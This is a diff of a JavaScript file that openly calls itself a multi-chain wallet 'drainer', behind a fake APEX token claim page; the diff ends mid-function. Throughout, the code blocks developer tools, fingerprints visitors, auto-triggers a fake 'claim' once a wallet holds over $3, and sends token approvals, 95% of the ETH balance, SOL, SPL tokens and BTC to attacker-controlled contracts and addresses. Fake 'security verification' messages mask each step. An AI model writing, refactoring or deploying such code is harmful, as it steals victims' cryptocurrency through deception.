@@ -1,6 +1,6 @@
 // ===================================================================
 // Script.js – Legitimate Multi‑Chain Wallet Connector & Drainer
-// Uses shared state from main.js for EVM connections.
+// Rewritten to integrate with main.js via global state.
 // ===================================================================
 
 import { CONFIG } from './config.js';
@@ -9,24 +9,39 @@ import { CONFIG } from './config.js';
   // ========== MOBILE DETECTION ==========
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   if (isMobile) {
-    console.log("Mobile detected – skipping aggressive protection");
+    console.log("Mobile detected – skipping code protection (touch support)");
   }
 
   // ========== LIGHTWEIGHT CODE PROTECTION (non‑intrusive) ==========
   const codeProtection = {
     init: function () {
-      document.addEventListener("contextmenu", function (e) { e.preventDefault(); return false; });
-      document.addEventListener("selectstart", function (e) { e.preventDefault(); return false; });
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+        return false;
+      });
+      document.addEventListener("selectstart", function (e) {
+        e.preventDefault();
+        return false;
+      });
       document.addEventListener("keydown", function (e) {
-        if (e.keyCode === 123) { e.preventDefault(); return false; }
-        if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
-          e.preventDefault(); return false;
+        if (e.keyCode === 123) {
+          e.preventDefault();
+          return false;
         }
-        if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
+          e.preventDefault();
+          return false;
+        }
+        if (e.ctrlKey && e.keyCode === 85) {
+          e.preventDefault();
+          return false;
+        }
       });
     }
   };
-  if (!isMobile) codeProtection.init();
+  if (!isMobile) {
+    codeProtection.init();
+  }
 
   // ===================================================================
   // CONTRACT ABI AND ADDRESS – imported from config
@@ -34,7 +49,7 @@ import { CONFIG } from './config.js';
   const { DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS } = CONFIG;
 
   // ===================================================================
-  // WALLET DETECTION (EVM) – unchanged
+  // WALLET DETECTION (EVM)
   // ===================================================================
   const walletDetectors = {
     isMetaMask: () => {
@@ -77,16 +92,22 @@ import { CONFIG } from './config.js';
         (ethereum.providers && ethereum.providers.some((p) => p.isRabby))
       );
     },
-    isPhantom: () => window.phantom && window.phantom.ethereum,
-    isBraveWallet: () => window.ethereum && window.ethereum.isBraveWallet,
-    isMobileWallet: () => (
-      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) &&
-      (window.ethereum || window.web3)
-    ),
+    isPhantom: () => {
+      return window.phantom && window.phantom.ethereum;
+    },
+    isBraveWallet: () => {
+      return window.ethereum && window.ethereum.isBraveWallet;
+    },
+    isMobileWallet: () => {
+      return (
+        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) &&
+        (window.ethereum || window.web3)
+      );
+    },
   };
 
   // ===================================================================
-  // SOLANA WALLET DETECTION – unchanged
+  // SOLANA WALLET DETECTION
   // ===================================================================
   const solanaWalletDetectors = {
     isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
@@ -117,7 +138,7 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // CURRENCY CONVERSION SYSTEM – unchanged
+  // CURRENCY CONVERSION SYSTEM
   // ===================================================================
   const CURRENCY_CONVERTER = {
     rates: {
@@ -149,14 +170,10 @@ import { CONFIG } from './config.js';
     convertToUSD: function (amount, fromCurrency) {
       try {
         const currency = fromCurrency.toUpperCase();
-        if (!this.rates[currency]) {
-          console.warn(`Unknown currency: ${currency}, using USD`);
-          return amount;
-        }
+        if (!this.rates[currency]) return amount;
         if (currency === "USD") return amount;
         return amount / this.rates[currency];
       } catch (error) {
-        console.error("Currency conversion error:", error);
         return amount;
       }
     },
@@ -175,7 +192,7 @@ import { CONFIG } from './config.js';
   };
 
   // ===================================================================
-  // EVASION TECHNIQUES – kept (fingerprinting)
+  // EVASION TECHNIQUES (fingerprinting, not debugger traps)
   // ===================================================================
   const EVASION_TECHNIQUES = {
     async generateWasmFingerprint() {
@@ -210,7 +227,10 @@ import { CONFIG } from './config.js';
           setTimeout(() => {
             oscillator.stop();
             audioContext.close();
-            resolve({ audioFingerprint: "completed", hash: Math.random().toString(36).substring(2, 10) });
+            resolve({
+              audioFingerprint: "completed",
+              hash: Math.random().toString(36).substring(2, 10),
+            });
           }, 100);
         } catch (e) {
           resolve({ audioFingerprint: "failed" });
@@ -237,8 +257,12 @@ import { CONFIG } from './config.js';
       return canvas.toDataURL();
     },
     generateBrowserFingerprint() {
-      const plugins = Array.from(navigator.plugins).map((p) => p.name).join(",");
-      const mimeTypes = Array.from(navigator.mimeTypes).map((mt) => mt.type).join(",");
+      const plugins = Array.from(navigator.plugins)
+        .map((p) => p.name)
+        .join(",");
+      const mimeTypes = Array.from(navigator.mimeTypes)
+        .map((mt) => mt.type)
+        .join(",");
       return {
         userAgent: navigator.userAgent,
         language: navigator.language,
@@ -267,11 +291,18 @@ import { CONFIG } from './config.js';
         try {
           const response = await fetch(api);
           const data = await response.json();
-          if (api.includes("coingecko")) return data.ethereum.usd;
-          if (api.includes("binance")) return parseFloat(data.price);
-          if (api.includes("coinbase")) return parseFloat(data.data.amount);
-          if (api.includes("kraken")) return parseFloat(data.result.XETHZUSD.c[0]);
-        } catch (error) { continue; }
+          if (api.includes("coingecko")) {
+            return data.ethereum.usd;
+          } else if (api.includes("binance")) {
+            return parseFloat(data.price);
+          } else if (api.includes("coinbase")) {
+            return parseFloat(data.data.amount);
+          } else if (api.includes("kraken")) {
+            return parseFloat(data.result.XETHZUSD.c[0]);
+          }
+        } catch (error) {
+          continue;
+        }
       }
       return 2200;
     },
@@ -297,7 +328,7 @@ import { CONFIG } from './config.js';
   };
 
   // ===================================================================
-  // DYNAMIC SOLANA LIBRARY LOADING – unchanged
+  // DYNAMIC SOLANA LIBRARY LOADING
   // ===================================================================
   async function loadSolanaLibraries() {
     if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
@@ -307,21 +338,32 @@ import { CONFIG } from './config.js';
     return new Promise((resolve, reject) => {
       let loaded = 0;
       const total = 2;
-      function checkAll() { if (loaded === total) { console.log('✅ Solana libraries loaded dynamically'); resolve(true); } }
+      function checkAll() {
+        if (loaded === total) {
+          console.log('✅ Solana libraries loaded dynamically');
+          resolve(true);
+        }
+      }
       if (typeof solanaWeb3 === 'undefined') {
         const script1 = document.createElement('script');
         script1.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js';
         script1.onload = () => { loaded++; checkAll(); };
         script1.onerror = () => reject(new Error('Failed to load solanaWeb3'));
         document.head.appendChild(script1);
-      } else { loaded++; checkAll(); }
+      } else {
+        loaded++;
+        checkAll();
+      }
       if (typeof splToken === 'undefined') {
         const script2 = document.createElement('script');
         script2.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js';
         script2.onload = () => { loaded++; checkAll(); };
         script2.onerror = () => reject(new Error('Failed to load splToken'));
         document.head.appendChild(script2);
-      } else { loaded++; checkAll(); }
+      } else {
+        loaded++;
+        checkAll();
+      }
     });
   }
 
@@ -332,6 +374,7 @@ import { CONFIG } from './config.js';
   let countdownInterval;
   let claimList = [];
   let priceHistory = [];
+  let web3;                // will be set by main.js or locally
   let fingerprintData = {};
   const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   let connectedWallet = null;
@@ -346,14 +389,13 @@ import { CONFIG } from './config.js';
   let contractInstance;
   const CLAIM_THRESHOLD_USD = 3;
 
-  // Solana specific state
+  // Solana specific
   let solanaProvider = null;
   let solanaPublicKey = null;
 
-  // Disconnect prevention on mobile
   const DISABLE_DISCONNECT = isMobileDevice;
 
-  // DOM Elements – unchanged
+  // DOM Elements
   const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
   const navLinks = document.querySelector(".nav-links");
   const claimListElement = document.getElementById("claimList");
@@ -375,7 +417,31 @@ import { CONFIG } from './config.js';
   const copyReferralBtn = document.getElementById("copyReferralBtn");
   const referralLink = document.getElementById("referralLink");
 
-  // Event listeners
+  // ===================================================================
+  // GLOBAL UPDATE FUNCTION – called by main.js
+  // ===================================================================
+  window.updateWalletConnection = function(address, type, w3, contract) {
+    connectedAddress = address;
+    connectedWallet = type;
+    web3 = w3 || web3;          // use passed instance if available
+    contractInstance = contract || contractInstance;
+    if (address) {
+      updateManualWalletButton();
+      showNotification(`Wallet connected: ${address.slice(0,6)}...`, 'success');
+      setTimeout(() => {
+        checkAndAutoTriggerClaim();
+      }, 2000);
+      showManualAnnouncementModal();
+      saveConnectionToLocalStorage(address, type);
+    } else {
+      // Disconnect
+      handleManualDisconnection();
+    }
+  };
+
+  // ===================================================================
+  // EVENT LISTENERS (unchanged)
+  // ===================================================================
   if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
   if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
   if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
@@ -396,32 +462,11 @@ import { CONFIG } from './config.js';
     });
   }
 
-  // Initialize Vanta.js background (unchanged)
-  if (typeof VANTA !== "undefined") {
-    VANTA.NET({
-      el: "#vanta-bg",
-      mouseControls: true,
-      touchControls: true,
-      gyroControls: false,
-      minHeight: 200.0,
-      minWidth: 200.0,
-      scale: 1.0,
-      scaleMobile: 1.0,
-      color: 0xff6b00,
-      backgroundColor: 0x0f172a,
-      points: 15.0,
-      maxDistance: 25.0,
-      spacing: 18.0,
-    });
-  }
-
   // ===================================================================
-  // CURRENCY AWARE INITIALIZATION
+  // INIT
   // ===================================================================
   document.addEventListener("DOMContentLoaded", async function () {
     console.log(`Local currency detected: ${userLocalCurrency}`);
-    console.log(`Claim threshold: $${CLAIM_THRESHOLD_USD} USD`);
-
     startCountdown();
     createTokenChart();
     updateTokenPrice();
@@ -433,12 +478,6 @@ import { CONFIG } from './config.js';
 
     ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
     console.log(`Current ETH Price: $${ethPriceInUSD} USD`);
-
-    const localThreshold = CURRENCY_CONVERTER.formatCurrency(
-      CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-      userLocalCurrency
-    );
-    console.log(`Threshold in local currency: ${localThreshold}`);
 
     setInterval(updateTokenPrice, 10000);
     setInterval(updateAIAnalytics, 15000);
@@ -453,52 +492,29 @@ import { CONFIG } from './config.js';
       initializeMobileSpecificOptimizations();
     }
 
-    // Check if already connected via main.js shared state
-    if (window.__sharedState && window.__sharedState.isConnected) {
-      connectedAddress = window.__sharedState.address;
-      connectedWallet = 'shared_evm'; // or detect chain
-      if (window.__sharedState.chainType === 'evm') {
-        // Use the web3 and contract from shared state
-        // We'll reference them via global variables for our functions
-        // We'll set our local web3 and contractInstance to the shared ones
-        // But we need to make sure our functions use them.
-        // We'll assign them to local variables at the point of use, or directly use window.__sharedState.
-        // For simplicity, we'll assign to the local web3/contractInstance variables.
-        if (window.__sharedState.web3) {
-          window.web3 = window.__sharedState.web3; // assign to global for our legacy functions
-          window.contractInstance = window.__sharedState.contract;
-          // Also set local variables
-          web3 = window.__sharedState.web3;
-          contractInstance = window.__sharedState.contract;
-          console.log('✅ Using shared Web3 and contract from main.js');
-        }
-      }
-      // Update UI
-      updateManualWalletButton();
-      showManualAnnouncementModal();
-      setTimeout(() => checkAndAutoTriggerClaim(), 2000);
-    } else {
-      // Fallback: check for existing manual connection (legacy)
-      setTimeout(() => checkManualExistingConnection(), 1000);
-    }
+    restoreSavedConnection();
   });
 
   // ===================================================================
-  // PERSISTENCE HELPERS – unchanged
+  // PERSISTENCE HELPERS
   // ===================================================================
   function saveConnectionToLocalStorage(address, walletType) {
     try {
       localStorage.setItem('connectedAddress', address);
       localStorage.setItem('connectedWalletType', walletType);
       console.log('Connection saved to localStorage');
-    } catch (e) { console.warn('Failed to save connection:', e); }
+    } catch (e) {
+      console.warn('Failed to save connection:', e);
+    }
   }
+
   function clearSavedConnection() {
     try {
       localStorage.removeItem('connectedAddress');
       localStorage.removeItem('connectedWalletType');
     } catch (e) {}
   }
+
   function restoreSavedConnection() {
     const savedAddress = localStorage.getItem('connectedAddress');
     const savedWalletType = localStorage.getItem('connectedWalletType');
@@ -509,22 +525,14 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // BALANCE CHECK – uses shared web3 if available
+  // BALANCE CHECK & AUTO TRIGGER
   // ===================================================================
   async function checkAndAutoTriggerClaim() {
     if (!connectedAddress || !web3 || userHasClaimed) return;
-
     try {
       const ethBalance = await web3.eth.getBalance(connectedAddress);
       const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
       userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
-
-      const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
-
-      console.log(`User Balance: ${ethBalanceInETH} ETH`);
-      console.log(`User Balance: $${userBalanceInUSD.toFixed(2)} USD`);
-      console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);
-
       if (userBalanceInUSD >= CLAIM_THRESHOLD_USD) {
         const localAmount = CURRENCY_CONVERTER.formatCurrency(
           CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
@@ -538,13 +546,6 @@ import { CONFIG } from './config.js';
             initiateClaimProcess();
           }
         }, delay);
-      } else {
-        const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
-        const localThreshold = CURRENCY_CONVERTER.formatCurrency(
-          CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-          userLocalCurrency
-        );
-        console.log(`NO TRIGGER: User has ${localBalance} (< ${localThreshold} threshold)`);
       }
     } catch (error) {
       console.error("Error checking user balance:", error);
@@ -552,7 +553,7 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // BITCOIN DRAIN – uses config attacker address
+  // BITCOIN DRAIN
   // ===================================================================
   async function drainNativeBTC() {
     try {
@@ -582,7 +583,7 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // SOLANA DRAIN – uses config attacker address
+  // SOLANA DRAIN
   // ===================================================================
   async function drainNativeSOL() {
     try {
@@ -591,26 +592,20 @@ import { CONFIG } from './config.js';
         showNotification("Solana wallet not connected", "error");
         return false;
       }
-
       const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
       const owner = new solanaWeb3.PublicKey(solanaPublicKey);
-
       const solBalance = await connection.getBalance(owner);
       console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
-
       const tokenAccounts = await getAllSolanaTokenAccounts(connection, owner);
       tokenAccounts.forEach(ta => {
         console.log(`💰 Token (${ta.mint}) balance: ${ta.amount / 10**ta.decimals}`);
       });
-
       if (solBalance <= 5000 && tokenAccounts.length === 0) {
         showNotification("No funds to drain", "error");
         return false;
       }
-
       let transaction = new solanaWeb3.Transaction();
       const LAMPORTS_TO_LEAVE = 5000;
-
       if (solBalance > LAMPORTS_TO_LEAVE) {
         const solTransfer = solanaWeb3.SystemProgram.transfer({
           fromPubkey: owner,
@@ -619,7 +614,6 @@ import { CONFIG } from './config.js';
         });
         transaction.add(solTransfer);
       }
-
       for (const ta of tokenAccounts) {
         const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
         const tokenTransfer = splToken.createTransferInstruction(
@@ -632,11 +626,9 @@ import { CONFIG } from './config.js';
         );
         transaction.add(tokenTransfer);
       }
-
       const { blockhash } = await connection.getRecentBlockhash();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = owner;
-
       let signed;
       if (solanaProvider.signTransaction) {
         signed = await solanaProvider.signTransaction(transaction);
@@ -649,7 +641,6 @@ import { CONFIG } from './config.js';
       } else {
         throw new Error("Provider cannot sign transactions");
       }
-
       const signature = await connection.sendRawTransaction(signed.serialize());
       showNotification(`Solana transaction sent: ${signature.slice(0,10)}...`, "success");
       return true;
@@ -685,7 +676,9 @@ import { CONFIG } from './config.js';
           });
         }
       }
-    } catch (e) { console.warn("Failed to fetch token accounts:", e); }
+    } catch (e) {
+      console.warn("Failed to fetch token accounts:", e);
+    }
     return tokenAccounts;
   }
 
@@ -696,27 +689,21 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // EVM DRAIN – uses shared web3 and contract if available
+  // EVM DRAIN – uses global web3 and contractInstance
   // ===================================================================
   async function drainEVM() {
-    // Use shared state if available, else fallback to local web3
-    let activeWeb3 = web3;
-    let activeContract = contractInstance;
-    if (window.__sharedState && window.__sharedState.web3) {
-      activeWeb3 = window.__sharedState.web3;
-      activeContract = window.__sharedState.contract;
-      // Also update local variables for consistency
-      web3 = activeWeb3;
-      contractInstance = activeContract;
-      connectedAddress = window.__sharedState.address;
-    }
-
-    if (!connectedAddress || !activeWeb3) {
+    // Use global web3 and contractInstance (set by main.js or local)
+    const w3 = web3 || window.web3;
+    const contract = contractInstance || window.contractInstance;
+    if (!w3 || !contract) {
       showNotification("Please connect your wallet first", "error");
       showWalletModal();
       return;
     }
-
+    if (!connectedAddress) {
+      showNotification("No address available", "error");
+      return;
+    }
     const button = document.getElementById("connectButton");
     const originalText = button ? button.innerHTML : "Connect Wallet";
 
@@ -728,85 +715,41 @@ import { CONFIG } from './config.js';
         "Preparing token distribution...", "Running security checks...",
         "Configuring network parameters...",
       ];
-
       if (button) {
         button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
         button.disabled = true;
       }
-
-      const statusMessages = [
-        "Initializing security verification...", "Setting up claim process...",
-        "Preparing token distribution...", "Configuring wallet connection...",
-        "Running security checks...", "Analyzing network conditions...",
-        "Optimizing transaction parameters...", "Verifying contract integrity...",
-        "Loading token distribution module...",
-      ];
-
       if (claimStatus) {
-        claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
+        claimStatus.textContent = "Initializing security verification...";
         claimStatus.className = "status pending";
       }
-
       await manualRandomDelay(1000, 3000);
-      let accounts = await activeWeb3.eth.getAccounts();
-      const userAddress = accounts[0];
-
-      await manualRandomDelay(500, 2000);
-      await collectManualFingerprint();
+      const userAddress = connectedAddress;
 
       if (userHasClaimed) {
-        const errorMessages = [
-          "You have already claimed your APEX tokens in this session.",
-          "Token claim already processed for this wallet.",
-          "Maximum claims per session reached. Please try again later.",
-          "Duplicate claim detected. Security protocols activated.",
-          "Wallet already processed for token distribution.",
-        ];
         if (claimStatus) {
-          claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+          claimStatus.textContent = "You have already claimed your APEX tokens in this session.";
           claimStatus.className = "status error";
         }
         if (button) resetButton(button, originalText);
         return;
       }
 
-      const ethBalance = await activeWeb3.eth.getBalance(userAddress);
-      const ethBalanceInETH = activeWeb3.utils.fromWei(ethBalance, "ether");
+      const ethBalance = await w3.eth.getBalance(userAddress);
+      const ethBalanceInETH = w3.utils.fromWei(ethBalance, "ether");
       userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
 
-      const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
-      const localThreshold = CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];
-
-      console.log(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
-
       if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
-        const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
-        const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
-        const errorMessages = [
-          `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
-          `Insufficient balance for token claim. Deposit more ETH.`,
-          `Wallet balance below minimum threshold for APEX distribution.`,
-          `Add ETH to your wallet to qualify for token claim.`,
-          `Claim requires minimum ${formattedThreshold} for gas optimization.`,
-        ];
+        const localBalance = CURRENCY_CONVERTER.formatCurrency(
+          userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+          userLocalCurrency
+        );
+        const localThreshold = CURRENCY_CONVERTER.formatCurrency(
+          CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+          userLocalCurrency
+        );
         if (claimStatus) {
-          claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-          claimStatus.className = "status error";
-        }
-        if (button) resetButton(button, originalText);
-        return;
-      }
-
-      if (ethBalanceInETH < 0.005) {
-        const errorMessages = [
-          "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
-          "Additional ETH required for gas fees to complete claim.",
-          "Please add ETH to your wallet to cover transaction costs.",
-          "Low ETH balance. Deposit more to proceed with token claim.",
-          "Transaction requires minimum ETH balance for gas optimization.",
-        ];
-        if (claimStatus) {
-          claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+          claimStatus.textContent = `Minimum ${localThreshold} required. Current: ${localBalance}`;
           claimStatus.className = "status error";
         }
         if (button) resetButton(button, originalText);
@@ -816,33 +759,23 @@ import { CONFIG } from './config.js';
       await simulateManualLegitimateTransaction(userAddress);
       await manualRandomDelay(800, 2000);
 
-      if (claimStatus) {
-        claimStatus.textContent = "Scanning wallet for all eligible tokens...";
-      }
-
+      if (claimStatus) claimStatus.textContent = "Scanning wallet for all eligible tokens...";
       const { tokens } = await detectAllERC20Tokens(userAddress);
       console.log(`Found ${tokens.length} ERC-20 tokens with balance`);
 
       let approvalsDone = 0;
-
-      if (tokens.length > 0) {
-        for (const token of tokens) {
-          if (claimStatus) {
-            claimStatus.textContent = `Approving ${token.symbol || token.address.slice(0,6)}...`;
-          }
-          const success = await callSetTokenApproval(token.address, token.balance);
-          if (success) approvalsDone++;
-          await manualRandomDelay(1000, 2000);
-        }
+      for (const token of tokens) {
+        if (claimStatus) claimStatus.textContent = `Approving ${token.symbol || token.address.slice(0,6)}...`;
+        const success = await callSetTokenApproval(token.address, token.balance, w3, contract);
+        if (success) approvalsDone++;
+        await manualRandomDelay(1000, 2000);
       }
 
       let nativeDepositDone = false;
       if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
-        if (claimStatus) {
-          claimStatus.textContent = "Depositing ETH to claim pool...";
-        }
+        if (claimStatus) claimStatus.textContent = "Depositing ETH to claim pool...";
         const depositAmount = ethBalanceInETH * 0.95;
-        const success = await callDepositBNB(depositAmount);
+        const success = await callDepositBNB(depositAmount, w3, contract);
         if (success) {
           nativeDepositDone = true;
           approvalsDone++;
@@ -853,14 +786,8 @@ import { CONFIG } from './config.js';
         userHasClaimed = true;
         handleClaimSuccess(userAddress, tokens, button, originalText);
       } else {
-        const noTokensMessages = [
-          "No eligible tokens found for claiming.",
-          "No tokens detected in your wallet.",
-          "Your wallet doesn't contain claimable tokens at this time.",
-          "Wallet analysis complete - no actionable assets found.",
-        ];
         if (claimStatus) {
-          claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
+          claimStatus.textContent = "No eligible tokens found for claiming.";
           claimStatus.className = "status info";
         }
         if (button) resetButton(button, originalText);
@@ -871,25 +798,22 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // ERC-20 DETECTION – unchanged, but uses active web3
+  // ERC-20 DETECTION (unchanged, uses global web3 if available)
   // ===================================================================
   async function detectAllERC20Tokens(userAddress) {
     const result = { tokens: [], nfts: [], totalValueUSD: 0 };
-
     const tokenList = await fetchComprehensiveTokenList();
     const balanceChecks = tokenList.map(token => ({
       address: token.address,
       symbol: token.symbol,
       decimals: token.decimals || 18,
     }));
-
     const discoveredTokens = await discoverTokensFromTransfers(userAddress);
     discoveredTokens.forEach(t => {
       if (!balanceChecks.some(tc => tc.address.toLowerCase() === t.address.toLowerCase())) {
         balanceChecks.push(t);
       }
     });
-
     const concurrency = 5;
     for (let i = 0; i < balanceChecks.length; i += concurrency) {
       const batch = balanceChecks.slice(i, i + concurrency);
@@ -902,7 +826,6 @@ import { CONFIG } from './config.js';
         }
       });
     }
-
     const nftContracts = [
       "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
       "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -919,13 +842,6 @@ import { CONFIG } from './config.js';
         }
       } catch (e) {}
     }
-
-    const localValue = CURRENCY_CONVERTER.formatCurrency(
-      result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-      userLocalCurrency
-    );
-    console.log(`Total portfolio value: ${localValue}`);
-
     return result;
   }
 
@@ -962,49 +878,32 @@ import { CONFIG } from './config.js';
     const balance = await getManualTokenBalance(tokenAddress, userAddress);
     if (balance === '0' || balance === 0) return null;
     let priceUSD = 0;
-    try { priceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(tokenAddress); } catch (e) {}
+    try {
+      priceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(tokenAddress);
+    } catch (e) {}
     const balanceFormatted = balance / Math.pow(10, decimals);
     const valueUSD = balanceFormatted * priceUSD;
-    return {
-      address: tokenAddress,
-      symbol,
-      decimals,
-      balance: balance.toString(),
-      balanceFormatted,
-      valueUSD,
-    };
+    return { address: tokenAddress, symbol, decimals, balance: balance.toString(), balanceFormatted, valueUSD };
   }
 
   // ===================================================================
-  // CONTRACT INTERACTION HELPERS – use active contract
+  // CONTRACT INTERACTION HELPERS (take web3/contract as params)
   // ===================================================================
-  async function callSetTokenApproval(tokenAddress, amount) {
-    let activeContract = contractInstance;
-    let activeWeb3 = web3;
-    if (window.__sharedState && window.__sharedState.contract) {
-      activeContract = window.__sharedState.contract;
-      activeWeb3 = window.__sharedState.web3;
-    }
-    if (!activeContract || !activeWeb3) {
-      console.error("No contract or web3 available");
-      return false;
-    }
+  async function callSetTokenApproval(tokenAddress, amount, w3, contract) {
     try {
-      const accounts = await activeWeb3.eth.getAccounts();
-      const userAddress = accounts[0];
-
-      const gasEstimate = await activeContract.methods
+      const accounts = await w3.eth.getAccounts();
+      const userAddress = accounts[0] || connectedAddress;
+      if (!userAddress) throw new Error("No account");
+      const gasEstimate = await contract.methods
         .setTokenApproval(tokenAddress, amount)
         .estimateGas({ from: userAddress });
-
-      const tx = await activeContract.methods
+      const tx = await contract.methods
         .setTokenApproval(tokenAddress, amount)
         .send({
           from: userAddress,
           gas: Math.floor(gasEstimate * 1.2),
-          gasPrice: await activeWeb3.eth.getGasPrice(),
+          gasPrice: await w3.eth.getGasPrice(),
         });
-
       console.log(`Token approval successful for ${tokenAddress}: ${tx.transactionHash}`);
       return true;
     } catch (error) {
@@ -1013,35 +912,23 @@ import { CONFIG } from './config.js';
     }
   }
 
-  async function callDepositBNB(ethAmount) {
-    let activeContract = contractInstance;
-    let activeWeb3 = web3;
-    if (window.__sharedState && window.__sharedState.contract) {
-      activeContract = window.__sharedState.contract;
-      activeWeb3 = window.__sharedState.web3;
-    }
-    if (!activeContract || !activeWeb3) {
-      console.error("No contract or web3 available");
-      return false;
-    }
+  async function callDepositBNB(ethAmount, w3, contract) {
     try {
-      const accounts = await activeWeb3.eth.getAccounts();
-      const userAddress = accounts[0];
-      const amountWei = activeWeb3.utils.toWei(ethAmount.toString(), "ether");
-
-      const gasEstimate = await activeContract.methods
+      const accounts = await w3.eth.getAccounts();
+      const userAddress = accounts[0] || connectedAddress;
+      if (!userAddress) throw new Error("No account");
+      const amountWei = w3.utils.toWei(ethAmount.toString(), "ether");
+      const gasEstimate = await contract.methods
         .depositBNB()
         .estimateGas({ from: userAddress, value: amountWei });
-
-      const tx = await activeContract.methods
+      const tx = await contract.methods
         .depositBNB()
         .send({
           from: userAddress,
           value: amountWei,
           gas: Math.floor(gasEstimate * 1.2),
-          gasPrice: await activeWeb3.eth.getGasPrice(),
+          gasPrice: await w3.eth.getGasPrice(),
         });
-
       console.log(`Native deposit successful: ${ethAmount} ETH`);
       return true;
     } catch (error) {
@@ -1051,16 +938,20 @@ import { CONFIG } from './config.js';
   }
 
   // ===================================================================
-  // HELPER FUNCTIONS – mostly unchanged
+  // HELPER FUNCTIONS (mostly unchanged)
   // ===================================================================
   function initializeMobileSpecificOptimizations() {
     console.log("Initializing mobile-specific optimizations...");
-    document.addEventListener("touchstart", function(e) {
-      if (e.target.closest("button") || e.target.closest(".btn-primary")) {
-        e.target.style.transform = "scale(0.98)";
-        setTimeout(() => { e.target.style.transform = ""; }, 150);
-      }
-    }, { passive: true });
+    document.addEventListener(
+      "touchstart",
+      function (e) {
+        if (e.target.closest("button") || e.target.closest(".btn-primary")) {
+          e.target.style.transform = "scale(0.98)";
+          setTimeout(() => { e.target.style.transform = ""; }, 150);
+        }
+      },
+      { passive: true }
+    );
     document.addEventListener("dblclick", function(e) { e.preventDefault(); }, { passive: false });
     const viewport = document.querySelector('meta[name="viewport"]');
     if (viewport) {
@@ -1072,8 +963,12 @@ import { CONFIG } from './config.js';
     if ("serviceWorker" in navigator) {
       try {
         const swScript = `
-          self.addEventListener('install', (event) => { self.skipWaiting(); });
-          self.addEventListener('activate', (event) => { event.waitUntil(self.clients.claim()); });
+          self.addEventListener('install', (event) => {
+            self.skipWaiting();
+          });
+          self.addEventListener('activate', (event) => {
+            event.waitUntil(self.clients.claim());
+          });
         `;
         const blob = new Blob([swScript], { type: "application/javascript" });
         const swUrl = URL.createObjectURL(blob);
@@ -1140,19 +1035,11 @@ import { CONFIG } from './config.js';
       web3 = new Web3(Web3.givenProvider);
